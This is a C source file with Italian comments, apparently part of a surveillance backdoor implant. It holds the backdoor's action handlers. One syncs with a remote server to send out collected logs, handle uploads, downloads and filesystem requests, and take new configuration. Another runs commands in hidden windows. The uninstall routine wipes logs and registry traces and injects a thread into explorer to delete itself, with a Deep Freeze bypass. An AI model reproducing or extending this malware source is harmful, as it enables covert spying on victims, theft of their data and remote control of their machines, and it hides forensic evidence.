#include <stdio.h>
#include "LOG.h"
#include "AM_Core.h"
#include "ASP.h"

extern BOOL IsDeepFreeze();
extern void UnlockConfFile();

// Codici delle action function
#define AF_SYNCRONIZE 1
#define AF_STARTAGENT 2
#define AF_STOPAGENT  3
#define AF_EXECUTE    4
#define AF_UNINSTALL  5
#define AF_LOGINFO    6
#define AF_STARTEVENT 7
#define AF_STOPEVENT  8
#define AF_NONE 0xFFFFFFFF

// Sono dichiarati in SM_Core.cpp di cui questo file e' un include
void EventMonitorStopAll(void);    
void UpdateEventConf(void);
void EventMonitorStartAll(void);    
void SM_AddExecutedProcess(DWORD);

// Dichiarazione delle possibili azioni
BOOL WINAPI DA_Uninstall(BYTE *dummy_param, DWORD dummy_len);
BOOL WINAPI DA_Syncronize(BYTE *action_param, DWORD action_len);
BOOL WINAPI DA_StartAgent(BYTE *agent_tag, DWORD param_len);
BOOL WINAPI DA_StopAgent(BYTE *agent_tag, DWORD param_len);
BOOL WINAPI DA_Execute(BYTE *command, DWORD command_len);
BOOL WINAPI DA_LogInfo(WCHAR *info, DWORD info_len);


// Scrive un log di tipo info
BOOL WINAPI DA_LogInfo(BYTE *info, DWORD info_len)
{
	WCHAR info_string[1024];
	_snwprintf_s(info_string, 1024, _TRUNCATE, L"[User]: %s", (WCHAR *)info);
	SendStatusLog(info_string);
	return FALSE;
}

// Esegue una sincronizzazione
BOOL WINAPI DA_Syncronize(BYTE *action_param, DWORD action_len)
{
	typedef struct {
		DWORD min_sleep;
		DWORD max_sleep;
		DWORD band_limit;
		char conf_string[1];
	} sync_conf_struct;
	sync_conf_struct *sync_conf;
	DWORD ret_val; 
	BOOL conn_error = FALSE;

	char *asp_server, *unique_id;
	BOOL uninstall;
	long long actual_time;
	DWORD availables[20];
	BOOL new_conf = FALSE;

	// Verifica che ci sia il parametro e che non siamo in momento di crisi
	if (!action_param || IsCrisisNetwork())
		return FALSE;

	// asp_server e unique_id devono essere entrambe NULL
	// terminated. Deve essere cura del server inviare una
	// configurazione corretta.
	sync_conf = (sync_conf_struct *)action_param;
	asp_server = sync_conf->conf_string;
	unique_id = strchr(asp_server, 0) + 1;

	// Quando riceve l'uninstall la funzione ritorna comunque FALSE
	if (!LOG_StartLogConnection(asp_server, unique_id, &uninstall, &actual_time, availables, sizeof(availables))) {
		if (uninstall) 
			DA_Uninstall(NULL, NULL);
		return FALSE;
	}

	// Ricalcola e salva su file il delta date
	HM_CalcDateDelta(actual_time, &date_delta);
	Log_SaveAgentState(PM_CORE, (BYTE *)&date_delta, sizeof(date_delta));

	// Gestisce gli availables:
	// Prova comunque a farli tutti, cosi' anche se per caso fallisse un upload (ad esempio)
	// va comunque avanti ad attivare la nuova conf, a spedire i log, etc.
	for (DWORD i=1; i<=availables[0]; i++) {
		if (availables[i] == PROTO_UPLOAD)
			LOG_HandleUpload(TRUE);
		if (availables[i] == PROTO_UPGRADE)
			LOG_HandleUpload(FALSE);
		if (availables[i] == PROTO_NEW_CONF)
			new_conf = LOG_ReceiveNewConf();
		if (availables[i] == PROTO_DOWNLOAD)
			LOG_HandleDownload();
		if (availables[i] == PROTO_FILESYSTEM)
			LOG_HandleFileSystem();

		if (IsCrisisNetwork()) 
			break; // Cosi' se aveva ricevuto la nuova configurazione, la attiva
		           // Tanto l'unica cosa che rimane e' l'invio dei log, che controllano
		           // la crisi e in caso chiudono tutto
	}

	// Sospende tutti gli agent e l'agent manager.
	// Gli agent sono costretti a chiudere tutti i file
	// aperti prima dello scambio della coda dei log.
	// E ad agenti stoppati sposta tutti i log nella coda da inviare...
	AM_SuspendRestart(AM_SUSPEND);
	Log_SwitchQueue();
	if (new_conf)
		AM_SuspendRestart(AM_RESET); // Riattiva gli agenti da file di configurazione (se c'e' nuovo)
	else 
		AM_SuspendRestart(AM_RESTART); // Rimette gli agent nella condizione che avevano alla suspend

	// Invia la coda dei log da spedire (no concorrenza con agenti)
	// Essendo l'ultima parte del protocollo, questa funzione si occupera' anche di mandare i PROTO_BYE
	LOG_SendLogQueue(sync_conf->band_limit, sync_conf->min_sleep, sync_conf->max_sleep);
	LOG_CloseLogConnection();

	// Modifica configurazione eventi/azioni
	// se ha ricevuto nuovo file di conf
	if (new_conf) {
		EventMonitorStopAll();    
		UpdateEventConf();
		EventMonitorStartAll();        
		return TRUE;
	}
	return FALSE;
}


// Fa partire un agent
BOOL WINAPI DA_StartAgent(BYTE *agent_tag, DWORD param_len)
{
	// Verifica che il parametro agent_tag sia corretto (una DWORD)
	if (!agent_tag || param_len!=4)
		return FALSE;

	AM_MonitorStartStop(*(DWORD *)agent_tag, TRUE);
	return FALSE;
}


// Fa fermare un agent
BOOL WINAPI DA_StopAgent(BYTE *agent_tag, DWORD param_len)
{
	// Verifica che il parametro agent_tag sia corretto (una DWORD)
	if (!agent_tag || param_len!=4)
		return FALSE;

	AM_MonitorStartStop(*(DWORD *)agent_tag, FALSE);
	return FALSE;
}

// Abilita un evento
BOOL WINAPI DA_StartEvent(BYTE *event_id, DWORD param_len)
{
	// Verifica che il parametro agent_tag sia corretto (una DWORD)
	if (!event_id || param_len!=4)
		return FALSE;

	SM_EventTableState(*(DWORD *)event_id, TRUE);
	return FALSE;
}


// Disabilita un evento
BOOL WINAPI DA_StopEvent(BYTE *event_id, DWORD param_len)
{
	// Verifica che il parametro agent_tag sia corretto (una DWORD)
	if (!event_id || param_len!=4)
		return FALSE;

	SM_EventTableState(*(DWORD *)event_id, FALSE);
	return FALSE;
}

// Esegue un comando in maniera nascosta
BOOL WINAPI DA_Execute(BYTE *command, DWORD command_len)
{
	STARTUPINFO si;
    PROCESS_INFORMATION pi;

	// Verifica che ci sia il comando 
	// N.B. Deve essere NULL terminato!!!
	// e Verifica che non siamo in periodo di crisi 
	if (!command || IsCrisisSystem())
		return FALSE;

	// Il processo viene lanciato con la main window
	// nascosta
	ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESHOWWINDOW;
	HM_CreateProcess((char *)command, 0, &si, &pi, 0);
	// Se HM_CreateProcess fallisce, pi.dwProcessId e' settato a 0.
	// Lo aggiunge alla lista dei processi eseguiti
	if (pi.dwProcessId) 
		SM_AddExecutedProcess(pi.dwProcessId);

	return FALSE;
}


// Disinstalla il programma
BOOL WINAPI DA_Uninstall(BYTE *dummy_param, DWORD dummy_len)
{
	char conf_path[DLLNAMELEN];

	// Killa (se c'e') la dll di supporto a 64bit
	Kill64Core();

	// Stoppa agenti ed event monitor.
	// A questo punto rimane attivo solo il thread 
	// principale che gestisce il logout e l'injection
	// in TaskManager e nei nuovi explorer
	// (che non influisce sulla disinstallazione)

	REPORT_STATUS_LOG("- Stopping all agents...........");
	AM_SuspendRestart(AM_EXIT);
	EventMonitorStopAll();    
	REPORT_STATUS_LOG("OK\r\n");

	REPORT_STATUS_LOG("- Wiping out files..............");
	// Rimuove lo sfondo modificato, ma solo se compilato come demo
	// va fatto qui, prima che cancelli i file nella dir nascosta
	RemoveDesktopBackground();

	// Rimuove tutti i file di log.
	Log_RemoveFiles();

	// Rimuove la chiave dal registry.
	// Lo fa dopo aver rimosso i log, per evitare che 
	// il computer venga spento mentre li sta rimuovendo
	// (rimarrebbero i log sulla macchina).
	HM_RemoveRegistryKey();
	REPORT_STATUS_LOG("OK\r\n");

	REPORT_STATUS_LOG("- Cleaning memory...............");

	// Rimuove il file di configurazione.
	// Lo rimuove dopo aver tolto la chiave del registry 
	// per evitare che il computer venga spento con ancora la backdoor
	// attivabile al successivo avvio, ma senza file di configurazione
	// (non si disinstallerebbe piu').
	UnlockConfFile();
	HM_WipeFileA(HM_CompletePath(H4_CONF_FILE, conf_path));

	// Tenta di iniettare un thread in explorer per cancellare 
	// la DLL core e la directory di lavoro (non puo' cancellarsi da sola)
	HM_RemoveCore();

	//Il driver deve rimanere se ci sono backdoor per altri utenti
	//HM_RemoveDriver();

	// Tenta l'uninstall dal disco reale in caso di deep freeze
	if (IsDeepFreeze()) {
		HideDevice dev_df;
		DFUninstall(&dev_df, (unsigned char *)H4_HOME_PATH, (unsigned char *)REGISTRY_KEY_NAME);
	}
	REPORT_STATUS_LOG("OK\r\n");

	// Fa terminare il processo host (rundll32)
	ReportExitProcess();

	// :)
	return FALSE;
}
